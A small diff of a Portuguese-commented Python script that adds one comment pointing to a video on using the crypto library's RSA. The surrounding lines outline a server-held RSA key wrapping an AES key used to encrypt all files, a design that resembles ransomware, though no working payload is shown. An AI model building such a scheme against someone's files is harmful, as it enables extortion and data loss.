@@ -146,6 +146,11 @@ valida()
 print('chaves publicas e privada do cliente geradas')
 #menu() # -> criptografa tudo
 criptografa_chave_AES(serv_RSA)
+
+'''
+     USAR O RSA DA LIB CRYPTO -> https://www.youtube.com/watch?v=tXSb7O6fao8
+'''
+
 descriptografa_chave_AES()
     # criptografa todos os arquivos com AES
 
